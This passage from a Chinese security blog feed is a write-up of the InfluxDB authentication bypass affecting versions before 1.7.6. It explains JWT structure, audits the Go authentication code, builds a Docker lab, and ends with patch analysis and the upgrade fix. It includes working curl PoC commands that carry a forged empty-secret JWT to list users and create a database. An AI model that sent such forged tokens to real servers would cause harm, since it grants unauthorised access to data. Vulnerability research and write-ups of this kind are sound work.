</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">field</span> <span class="keyword">keys</span></span><br><span class="line"><span class="comment">-- 查看一个measurement中所有的保存策略(可以有多个，一个标识为default)</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">retention</span> policies;</span><br></pre></td></tr></table></figure><h3 id="Influxdb函数详解"><a href="#Influxdb函数详解" class="headerlink" title="Influxdb函数详解"></a>Influxdb函数详解</h3><p>参考：<a href="https://tanjiti.github.io/2019/02/20/influxdb函数详解/" target="_blank" rel="noopener">influxdb函数详解</a></p><h3 id="HTTP接口"><a href="#HTTP接口" class="headerlink" title="HTTP接口"></a>HTTP接口</h3><p>Influxdb相关接口具体可参考官方文档：</p><p>下面之看下几个简单的例子。</p><h4 id="query"><a href="#query" class="headerlink" title="/query"></a>/query</h4><p>数据主要使用/query接口查询，下面给出一些常见用法，而更多用法参见：<a href="https://docs.influxdata.com/influxdb/v1.7/guides/querying_data/" target="_blank" rel="noopener">Querying data with the HTTP API</a> 。</p><ul><li><p>创建数据库</p><p>POST请求可用于创建数据库，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://localhost:8086/query --data-urlencode <span class="string">"q=CREATE DATABASE &lt;databasename&gt;"</span></span><br></pre></td></tr></table></figure></li><li><p>查询</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET http://localhost:8086/query?pretty=<span class="literal">true</span> --data-urlencode <span class="string">'db=&lt;database name&gt;'</span> --data-urlencode <span class="string">'q=SELECT "field1","tag1"... FROM &lt;measurement&gt; WHERE &lt;condition&gt;'</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="write"><a href="#write" class="headerlink" title="/write"></a>/write</h4><p>发送POST请求是写入数据的主要方式，下面给出一些常见用法，而更多用法参见：<a href="https://docs.influxdata.com/influxdb/v1.7/guides/writing_data/" target="_blank" rel="noopener">Writing data with the HTTP API</a> 。</p><ul><li><p>插入一条Point：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://localhost:8086/write?db=&lt;database name&gt; --data-binary <span class="string">"cpu_load,machine=001,region=cn value=0.56 1555164637838240795"</span></span><br></pre></td></tr></table></figure><p>必须指定<code>database name</code></p></li></ul><h3 id="身份认证机制——JWT"><a href="#身份认证机制——JWT" class="headerlink" title="身份认证机制——JWT"></a>身份认证机制——JWT</h3><p>Influxdb支持基于密码的身份认证和基于JWT的身份认证。</p><p>下面详细介绍JWT机制。</p><h4 id="JWT基本原理"><a href="#JWT基本原理" class="headerlink" title="JWT基本原理"></a>JWT基本原理</h4><p>JWT即JSON Web Tokens，是目前最流行的跨域身份验证解决方案。</p><p>JWT的原理就是在服务器身份验证之后，将生成一个JSON对象并将其发送回用户，如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"Username"</span>: <span class="string">"mi1k7ea"</span>,</span><br><span class="line">  <span class="string">"Role"</span>: <span class="string">"Admin"</span>,</span><br><span class="line">  <span class="string">"Expire"</span>: <span class="string">"2020-01-01 00:00:00"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此后，用户与服务端通信时，都要发回这个JSON对象。服务器完全只靠这个对象认定用户身份。为了防止用户篡改数据，服务器在生成这个对象的时候，会加上签名。</p><p>服务器不保存任何session数据，也就是说，服务器变成无状态，从而比较容易实现扩展。</p><h4 id="JWT原理图"><a href="#JWT原理图" class="headerlink" title="JWT原理图"></a>JWT原理图</h4><p>如下：</p><p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/1.png" alt=""></p><h4 id="JWT结构"><a href="#JWT结构" class="headerlink" title="JWT结构"></a>JWT结构</h4><p>一个示例的JWT如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span><br></pre></td></tr></table></figure><p>这是一个很长的字符串，中间用点<code>.</code>分隔成三个部分。</p><p>一个JWT实际上就是一个字符串，由三部分组成：</p><ul><li>Header（头部）</li><li>Payload（载荷）</li><li>Signature（签名）</li></ul><h5 id="Header（头部）"><a href="#Header（头部）" class="headerlink" title="Header（头部）"></a>Header（头部）</h5><p>Header部分是一个JSON对象，描述JWT的元数据，通常是下面的样子。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"alg"</span>: <span class="string">"HS256"</span>,</span><br><span class="line">  <span class="attr">"typ"</span>: <span class="string">"JWT"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码中，alg属性表示签名的算法（algorithm），默认是HMAC SHA256（写成HS256）；typ属性表示这个令牌（token）的类型（type），JWT令牌统一写为JWT。</p><p>最后，将上面的JSON对象使用Base64URL算法转成字符串。</p><h5 id="Payload（载荷）"><a href="#Payload（载荷）" class="headerlink" title="Payload（载荷）"></a>Payload（载荷）</h5><p>Payload部分也是一个JSON对象，用来存放实际需要传递的数据。JWT规定了7个官方字段供选用：</p><ul><li>iss (issuer)：签发人</li><li>exp (expiration time)：过期时间</li><li>sub (subject)：主题</li><li>aud (audience)：受众</li><li>nbf (Not Before)：生效时间</li><li>iat (Issued At)：签发时间</li><li>jti (JWT ID)：编号</li></ul><p>除了官方字段，你还可以在这个部分定义私有字段，下面就是一个例子。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"sub"</span>: <span class="string">"1234567890"</span>,</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"John Doe"</span>,</span><br><span class="line">  <span class="attr">"admin"</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意，JWT默认是不加密的，任何人都可以读到，所以不要把秘密信息放在这个部分。</strong></p><p>这个JSON对象也要使用Base64URL算法转成字符串。</p><h5 id="Signature（签名）"><a href="#Signature（签名）" class="headerlink" title="Signature（签名）"></a>Signature（签名）</h5><p>Signature部分是对前两部分的签名，防止数据篡改。</p><p>首先，<strong>需要指定一个密钥（secret）</strong>。这个密钥只有服务器才知道，不能泄露给用户。然后，使用 Header 里面指定的签名算法（默认是HMAC SHA256），按照下面的公式产生签名：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + "." +</span><br><span class="line">  base64UrlEncode(payload),</span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure><p>算出签名以后，把Header、Payload、Signature三个部分拼成一个字符串，每个部分之间用<code>.</code>分隔，就可以返回给用户。</p><h5 id="Base64URL算法"><a href="#Base64URL算法" class="headerlink" title="Base64URL算法"></a>Base64URL算法</h5><p>前面提到，Header和Payload串型化的算法是Base64URL。这个算法跟Base64算法基本类似，但有一些小的不同。</p><p>JWT作为一个令牌（token），有些场合可能会放到URL（比如api.example.com/?token=xxx）。Base64有三个字符<code>+</code>、<code>/</code>和<code>=</code>，在URL里面有特殊含义，所以要被替换掉：<code>=</code>被省略、<code>+</code>替换成<code>-</code>，<code>/</code>替换成<code>_</code> 。这就是Base64URL算法。</p><h4 id="JWT的用法"><a href="#JWT的用法" class="headerlink" title="JWT的用法"></a>JWT的用法</h4><p>客户端收到服务器返回的JWT，可以储存在Cookie或LocalStorage中。</p><p>此后，客户端每次与服务器通信，都要带上这个JWT。你可以把它放在Cookie里面自动发送，但是这样不能跨域，所以更好的做法是放在HTTP请求的头信息<code>Authorization</code>字段里面：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Bearer &lt;token&gt;</span><br></pre></td></tr></table></figure><p>另一种做法是，跨域的时候JWT就放在POST请求的数据体里面。</p><h4 id="如何生成JWT"><a href="#如何生成JWT" class="headerlink" title="如何生成JWT"></a>如何生成JWT</h4><p>在线网站可生成JWT凭据：<a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a></p><h2 id="0x02-Influxdb认证绕过漏洞"><a href="#0x02-Influxdb认证绕过漏洞" class="headerlink" title="0x02 Influxdb认证绕过漏洞"></a>0x02 Influxdb认证绕过漏洞</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Influxdb &lt; 1.7.6 的版本。</p><h3 id="漏洞原理及代码审计"><a href="#漏洞原理及代码审计" class="headerlink" title="漏洞原理及代码审计"></a>漏洞原理及代码审计</h3><p>Influxdb认证绕过漏洞，说白了就是默认的不安全配置导致的逻辑漏洞（未校验JWT的Signature部分的secret即密钥是否为空），可导致正常的身份认证被绕过。在Influxdb中，JWT的默认设置不会在“共享秘密”键中创建任何值。换句话说，默认情况下，创建有效的JWT令牌所需的“secret”为空。</p><p>下面我们下载1.7.5版本的Influxdb源码进行GO语言的代码审计，可控漏洞点出在哪里。</p><p>我们知道PoC是如下的形式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -G <span class="string">'http://xxx:8086/query'</span> --data-urlencode <span class="string">'q=show users'</span> -H <span class="string">'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1Nzg1ODU2MDAsInVzZXJuYW1lIjoibWkxazdlYSJ9.eVk8Dp16Oz-0qqXN0eEZKXqQErlLRgAhe60yzholS7k'</span></span><br></pre></td></tr></table></figure><p>那么直接搜索关键词来寻找对应的认证代码，如搜索“Authorization”，找到influxdb-1.7.5\services\httpd\handler.go这个文件。在其中看到authenticate()即认证函数，这里会调用parseCredentials()函数来解析凭证，然后根据返回的凭证方法到下面的switch语句中匹配：</p><p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/2.png" alt=""></p><p>跟进parseCredentials()函数，当中获取Authorization头字段，若不为空，则通过空格切割其值，然后switch语句匹配第一个值的内容，当匹配到“Bearer”时则返回包含Method为“BearerAuthentication”的creds变量：</p><p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/3.png" alt=""></p><p>返回到authenticate()函数中，继续往下，就能匹配到switch语句的BearerAuthentication代码块：</p><p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/4.png" alt=""></p><p>这段代码解析到token具体的值后，获取其中声明的exp和username的值，这里exp需要满足float64类型的数值、username需要是个字符串类型，接着根据username即用户名去查找是否存在该用户，若都不报错则调用inner()函数成功往下执行，即认证成功。</p><p>在这里我们可以明显看到，我们的JWT的Signature部分的secret即密钥是可以设置为空的，因为这里没有对其是否为空进行校验，并且默认也是为空的，即：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + "." +</span><br><span class="line">  base64UrlEncode(payload),)</span><br></pre></td></tr></table></figure><p>由于没有使用密钥对前面两个部分的内容进行加密，因此任意用户只要知道用户名就可以构造JWT凭证来绕过认证。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>这里我们使用Docker来搭建漏洞环境。</p><p>依次执行如下命令即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 搜索Influxdb Docker容器</span></span><br><span class="line">docker search influxdb</span><br><span class="line"><span class="comment"># 拉取漏洞版本的镜像</span></span><br><span class="line">docker pull influxdb:1.7.5</span><br><span class="line"><span class="comment"># 运行docker容器</span></span><br><span class="line">docker run -it -d --name influxdb -p 8086:8086 influxdb:1.7.5</span><br><span class="line"><span class="comment"># 进入运行的docker容器中</span></span><br><span class="line">docker <span class="built_in">exec</span> -it influxdb /bin/bash</span><br></pre></td></tr></table></figure><p>接着新建数据库用户，在influx终端运行如下命令创建新用户mi1k7ea：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; use _internal</span><br><span class="line">Using database _internal</span><br><span class="line">&gt; create user "mi1k7ea" with password '123456' with all privileges</span><br><span class="line">&gt; show users</span><br><span class="line">user    admin</span><br><span class="line"><span class="comment">----    -----</span></span><br><span class="line">mi1k7ea true</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>然后在Influxdb的配置文件/etc/influxdb/influxdb.conf中添加配置开启认证：</p><p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/10.png" alt=""></p><p>然后重启即可。</p><h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>先确定版本号是否存在漏洞，这里看到版本为1.7.5 &lt; 1.7.6，是存在认证绕过漏洞的版本：</p><p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/6.png" alt=""></p><p>接着，判断Influxdb服务绑定的端口号以及是否在公网进行监听：</p><p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/7.png" alt=""></p><p>默认情况下，Influxdb服务是绑定在8086端口上供其他进程访问的。如果是监听在公网上，则存在未授权访问漏洞，漏洞危害达到最大化。</p><p>下面的利用先在本地测试。</p><p>输入如下命令进行用户名发现：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -G <span class="string">'http://127.0.0.1:8086/debug/requests'</span></span><br></pre></td></tr></table></figure><p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/8.png" alt=""></p><p>可以看到并没有返回数据库相关的用户名。</p><p>尝试直接访问/query接口，发现没有认证凭据不能访问：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -G -X POST <span class="string">'http://127.0.0.1:8086/query'</span> --data-urlencode <span class="string">'q=show users'</span></span><br></pre></td></tr></table></figure><p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/13.png" alt=""></p><h4 id="构造PoC"><a href="#构造PoC" class="headerlink" title="构造PoC"></a>构造PoC</h4><p>下面我们就来构造实现认证绕过的JWT。</p><p>由前面的分析知道，我们需要填写的仅仅是第二部分的Payload中的username和exp而已。这里username是Influxdb中存在的用户名即可，而exp (expiration time)即认证有效时间，需要我们设置得比当前时间大。</p><p>我们可以通过在线工具方便地获取：</p><p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/14.png" alt=""></p><p>除了线上的方法，这里列下几种编程语言生成时间戳的代码实现。</p><p>Java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">int</span>) (System.currentTimeMillis() / <span class="number">1000</span>)</span><br></pre></td></tr></table></figure><p>Python：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line">time.time()</span><br></pre></td></tr></table></figure><p>PHP：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time()</span><br></pre></td></tr></table></figure><p>这样，就可以直接到<code>https://jwt.io/</code>中构造JWT了，这里攻击者只需知道Influxdb数据库存在mi1k7ea用户即可（注意：第三部分Signature中的secret即密钥设置为空，因为默认都是无共享密钥的，即使目标服务端设置了我们也无从知道也无法利用）：</p><p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/12.png" alt=""></p><p>最终PoC如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -G <span class="string">'http://127.0.0.1:8086/query'</span> --data-urlencode <span class="string">'q=show users'</span> -H <span class="string">'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1Nzg1ODU2MDAsInVzZXJuYW1lIjoibWkxazdlYSJ9.eVk8Dp16Oz-0qqXN0eEZKXqQErlLRgAhe60yzholS7k'</span></span><br></pre></td></tr></table></figure><p>本地利用效果如图，成功查询得到用户信息：</p><p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/11.png" alt=""></p><p>修改下PoC的利用方式，添加新的数据库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -G <span class="string">'http://127.0.0.1:8086/query'</span> --data-urlencode <span class="string">'q=create database hacked'</span> -H <span class="string">'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1Nzg1ODU2MDAsInVzZXJuYW1lIjoibWkxazdlYSJ9.eVk8Dp16Oz-0qqXN0eEZKXqQErlLRgAhe60yzholS7k'</span></span><br></pre></td></tr></table></figure><p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/15.png" alt=""></p><p>远程利用也是一样的，直接往目标服务端的Influxdb接口发送PoC即可成功利用：</p><p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/9.png" alt=""></p><h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>这里下载1.7.6版本的Influxdb，打开influxdb-1.7.6\services\httpd\handler.go这个文件对比发现，在解析JWT之前多了一段代码：</p><p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/5.png" alt=""></p><p>可以看到该代码判断当前JWT的secret即密钥是否为空，若为空则直接报错，从而修补了漏洞。</p><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>升级Influxdb至最新版即可。</p><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://www.komodosec.com/post/when-all-else-fails-find-a-0-day" target="_blank" rel="noopener">When all else fails – find a 0-day</a></p><p><a href="http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html" target="_blank" rel="noopener">JSON Web Token 入门教程</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="GO" scheme="https://www.mi1k7ea.com/categories/GO/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="GO" scheme="https://www.mi1k7ea.com/tags/GO/"/>
    
      <category term="Influxdb" scheme="https://www.mi1k7ea.com/tags/Influxdb/"/>
    
  </entry>
  
</feed>
